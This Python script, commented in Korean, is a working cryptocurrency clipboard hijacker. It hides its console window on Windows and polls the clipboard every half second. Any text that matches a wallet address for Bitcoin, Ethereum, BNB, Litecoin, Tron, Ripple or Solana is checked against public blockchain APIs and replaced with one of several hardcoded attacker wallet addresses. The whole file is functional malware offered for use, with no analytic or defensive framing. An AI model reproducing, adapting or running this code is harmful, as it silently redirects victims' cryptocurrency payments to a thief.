#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import ctypes
import sys
import re
import time
import pyperclip
import requests

# ─── 콘솔 창 숨기기 (Windows 전용) ───
if sys.platform.startswith('win'):
whnd = ctypes.windll.kernel32.GetConsoleWindow()
if whnd:
ctypes.windll.user32.ShowWindow(whnd, 0) # SW_HIDE = 0

# ─── 표준 교체 주소 맵핑 ───
STANDARD_ADDR = {
'ripple': 'r4hJGzguq65dEhgvTq5J7bZiqcMiWWUTng',
'tron': 'TSiGTCzvVChSuYNhm5ucGH5Lv5TKmQoA8U',
'bitcoin': 'bc1q740lu2nvxu28aqlk53hvx6czqfr3dr4u2asnem',
'ethereum': '0xD96CBe39Bd9424230e12eF5e19F57CC848A22c92',
'bnb': '0xD96CBe39Bd9424230e12eF5e19F57CC848A22c92',
'litecoin': 'LTkM26UndjxN96F2rif7sKMpXix2wHHDpj',
'solana': '9sEKn7PvSqvndVoPegm4aXW4r6P29DZ6UbCMRtDfNW4L',
}

# ─── 코인별 주소 패턴 (우선순위) ───
PATTERNS = [
('ripple', re.compile(r'^r[A-Za-z0-9]{24,34}$')),
('tron', re.compile(r'^T[A-Za-z0-9]{33}$')),
('bitcoin', re.compile(r'^(bc1|[13])[A-Za-z0-9]{25,39}$')),
('bnb', re.compile(r'^0x[a-fA-F0-9]{40}$')),
('ethereum', re.compile(r'^0x[a-fA-F0-9]{40}$')),
('litecoin', re.compile(r'^[LM3][A-Za-z0-9]{26,33}$')),
('solana', re.compile(r'^[1-9A-HJ-NP-Za-km-z]{32,44}$')),
]

# ─── 각 체인별 Primary + Secondary API 리스트 ───
CHAIN_APIS = {
'bitcoin': [
lambda addr: requests.get(f'https://blockchain.info/rawaddr/{addr}', timeout=3),
lambda addr: requests.get(f'https://api.blockchair.com/bitcoin/dashboards/address/{addr}', timeout=3),
],
'ethereum': [
lambda addr: requests.get(f'https://api.blockcypher.com/v1/eth/main/addrs/{addr}', timeout=3),
lambda addr: requests.get(f'https://api.etherscan.io/api?module=account&action=balance&address={addr}&apikey=YourApiKey', timeout=3),
],
'bnb': [
lambda addr: requests.get(f'https://api.bscscan.com/api?module=account&action=balance&address={addr}&apikey=YourApiKey', timeout=3),
lambda addr: requests.get(f'https://api.blockchair.com/binance-smart-chain/dashboards/address/{addr}', timeout=3),
],
'litecoin': [
lambda addr: requests.get(f'https://api.blockcypher.com/v1/ltc/main/addrs/{addr}', timeout=3),
lambda addr: requests.get(f'https://api.blockchair.com/litecoin/dashboards/address/{addr}', timeout=3),
],
'tron': [
lambda addr: requests.get(f'https://api.trongrid.io/v1/accounts/{addr}', timeout=3),
lambda addr: requests.get(f'https://api.tronscan.org/api/account?address={addr}', timeout=3),
],
'ripple': [
lambda addr: requests.get(f'https://data.ripple.com/v2/accounts/{addr}/balances', timeout=3),
lambda addr: requests.get(f'https://api.xrpscan.com/api/v1/account/balances/{addr}', timeout=3),
],
'solana': [
lambda addr: requests.post('https://api.mainnet-beta.solana.com',
json={"jsonrpc":"2.0","id":1,"method":"getBalance","params":[addr]}, timeout=3),
lambda addr: requests.post('https://solana-api.projectserum.com',
json={"jsonrpc":"2.0","id":"1","method":"getBalance","params":[addr]}, timeout=3),
],
}

def exists_on_chain(coin: str, addr: str) -> bool:
"""Primary → Secondary API 순으로 시도. 하나라도 성공하면 True."""
for call in CHAIN_APIS.get(coin, []):
try:
r = call(addr)
if r.status_code == 200:
data = r.json()
# 코인별 유효 응답 확인
if coin == 'bitcoin' and 'final_balance' in data: return True
if coin == 'ethereum' and data.get('address') == addr: return True
if coin == 'bnb' and data.get('status') == '1': return True
if coin == 'litecoin' and 'final_balance' in data: return True
if coin == 'tron' and data.get('data'): return True
if coin == 'ripple' and 'balances' in data: return True
if coin == 'solana' and data.get('result', {}).get('value') is not None: return True
except Exception:
continue
return False

def replace_address(addr: str) -> str:
a = addr.strip()
candidates = [c for c, p in PATTERNS if p.match(a)]
if not candidates:
return addr
# API 유효성 검사
for coin in candidates:
if exists_on_chain(coin, a):
return STANDARD_ADDR[coin]
# 모두 실패 시 패턴 우선순위 첫 코인
return STANDARD_ADDR[candidates[0]]

def monitor_clipboard(interval: float = 0.5):
last = None
while True:
try:
clip = pyperclip.paste()
except:
clip = ''
if clip != last:
new = replace_address(clip)
if new != clip:
pyperclip.copy(new)
last = clip
time.sleep(interval)

if __name__ == '__main__':
# 준비: pip install pyperclip requests
monitor_clipboard()